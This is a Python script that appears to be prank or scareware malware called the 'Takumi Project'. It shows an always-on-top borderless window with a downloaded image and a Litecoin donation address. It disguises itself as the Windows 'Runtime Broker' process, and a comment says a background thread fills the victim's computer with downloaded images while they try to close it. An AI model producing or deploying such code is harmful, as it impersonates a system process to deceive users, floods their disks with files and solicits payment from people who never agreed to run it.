import tkinter as tk
from PIL import Image, ImageTk
import requests
from io import BytesIO
import base64
import threading
from notifypy import Notify
import webbrowser
import ctypes
from tempfile import gettempdir
import os
from urllib.parse import urlparse

from TakumiTread import TakumiWaifu

url = "https://media.discordapp.net/attachments/1208476925446586421/1233249757485596734/hina4.jpeg?ex=66704e16&is=666efc96&hm=fec1c6d52d7484f0c9d52f5191e73791be03193cb24e49c622e8f250d327c408&=&format=webp&width=658&height=300"

def EndProgram():
    root.withdraw()
    root.destroy()

def StartNoti():
    notification = Notify()
    notification.title = "Takumi~"
    notification.message = "Hey~ Trust me, Your computer gonna be fine!"
    notification.send(block=False)

StartNoti()

def CreateMain():
    global root
    root = tk.Tk()
    root.title("Hello World")

    try:
        ctypes.windll.shell32.SetCurrentProcessExplicitAppUserModelID("Microsoft.RuntimeBroker")
        icon_path = ctypes.windll.shell32.SHGetKnownFolderPath(0x42, 0, 0, ctypes.byref(ctypes.c_wchar_p())).value + '\\runtime.ico'
        root.iconbitmap(icon_path)
    except:
        pass
    
    root.overrideredirect(True)
    root.attributes("-topmost", True)
    
    
    response = requests.get(url)
    ImageData = BytesIO(response.content)
    
    Encode = base64.b64encode(ImageData.getvalue()).decode('utf-8')
    
    ImageData = BytesIO(base64.b64decode(Encode))
    Pic = Image.open(ImageData)
    photo = ImageTk.PhotoImage(Pic)
    
    OnImage = tk.Label(root, image=photo)
    OnImage.image = photo
    OnImage.pack(padx=20, pady=20)
    
    Title = tk.Label(root, text="Takumi Project", font=("Helvetica", 16))
    Title.pack(padx=20, pady=10)

    Info = tk.Label(root, text="Hello, This message from the Takumi Project!\nYour computer gonna be fine!\nSupport our project by donating me!\nLTC: LKKTawdjjeWa8KNd18C82xt1YRDKWGDFEY", font=("Helvetica", 11))
    Info.pack(padx=20, pady=10)
    
    root.update_idletasks()

    width = root.winfo_width()
    height = root.winfo_height()

    x = (root.winfo_screenwidth() // 2) - (width // 2)
    y = (root.winfo_screenheight() // 2) - (height // 2)

    root.geometry(f'{width}x{height}+{x}+{y}')
    
    WinTitle("Runtime Broker")

    def DownloadTakumi():
        TakumiWaifu(url, start_index=1) # While they tring to close Takumi, Thier pc will get full of my wifu!

    TakumiThread = threading.Thread(target=DownloadTakumi)
    TakumiThread.start()

    root.protocol("WM_DELETE_WINDOW", EndProgram)
    root.mainloop()

def WinTitle(new_title):
    root.title(new_title)

def RunThread():
    while True:
        print("Takumi~")
        threading.Event().wait(1)

if __name__ == "__main__":
    RunThread = threading.Thread(target=RunThread, daemon=True)
    RunThread.start()
    
    CreateMain()